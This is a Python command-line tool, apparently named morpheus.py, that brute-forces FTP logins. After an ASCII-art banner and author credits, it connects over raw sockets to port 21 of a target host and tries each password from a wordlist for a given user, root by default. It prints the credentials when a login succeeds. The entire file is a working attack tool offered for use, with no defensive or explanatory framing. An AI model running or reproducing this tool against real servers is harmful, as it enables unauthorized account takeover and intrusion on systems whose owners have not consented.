#!/usr/bin/env python3
import os
import socket
import argparse
from sys import exit

def banner():
    banner = '''
    
                                _,-----.
                  _,------.__,-'        `.  .            .
               .-'                        `//__          \\
              |                           ((___`-_____    ))
              |                            \_alf)     \`=:'
              |                               `=|      |=,'
             /                                  | O   (|
            /  /\                               |      |
           /  /  \    .                          \     |
          |  /   /|  / `--.   ___            __,,-.    |
          | /   //  /      `-'   \  ,_    /''     |  o o|
         / |   | |  |             \ \ `.  |        ``--'
         mmm   | |  |              \ \ |  |
               | |\ |              |  ||  |
               | | ||              / / `. )
                \ \ \\            / /   | |
                 |_| ||          / /    | |
                     |_\         \_|    |  \\
                                         \__\\

    Author: Gabriel Dutra a.k.a CoolR00t
    email: gabrieldmdutra@gmail.com
    linkedin: linkedin.com/in/gmdutra
    '''    

    print(banner)


help_message = '''
    Arguments:
        --host,     -h      target
        --user,     -u      user, default is root
        --wordlist, -w      wordlist used for the attack
    
    Example:
        python morpheus.py --host 192.168.1.1 --user root --wordlist wordlist.txt

'''

class BruteFTB(object):
    def __init__(self, host, user, wordlist):
        self.user = user
        self.host = host
        self.wordlist = wordlist
    
    def Checkout(self):
        
        with open(self.wordlist, "r") as wordlist:
            read = wordlist.readlines()
        
            for line in read:
                sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
                sc.connect((self.host, 21))
                sc.recv(1024)

                sc.send("USER {0}\r\n".format(self.user).encode())
                sc.recv(1024)
                sc.send("PASS {0}\r\n".format(line.strip()).encode())
                
                r = sc.recv(1024)
                sc.send("QUIT\r\n".encode())

                if u"230 Login successful" in str(r):
                    print("\n\n")
                    print("----------Successful----------")
                    print("Target: {0}".format(self.host))
                    print("Username: {0}".format(self.user))
                    print("Password: {0}".format(line.strip()))
                    print("------------------------------")
                    exit(0)
                else:            
                    print("User: {0} - Password: {1} - failed".format(self.user, line.strip()))

def main():

    parser = argparse.ArgumentParser(add_help=False, usage=help_message)
    parser.add_argument('--host', '-h',     action="store", dest="host",\
                            required=True)
   
    parser.add_argument("--user", '-u',     action="store", dest="user",\
                            required=True)
   
    parser.add_argument("--wordlist", '-w', action="store", dest="wordlist",\
                            required=True)

    given_args = parser.parse_args()

    host        = given_args.host
    user        = given_args.user
    wordlist    = given_args.wordlist

    FTP = BruteFTB(host, user, wordlist)
    FTP.Checkout()

if __name__=='__main__':
    banner()
    main()
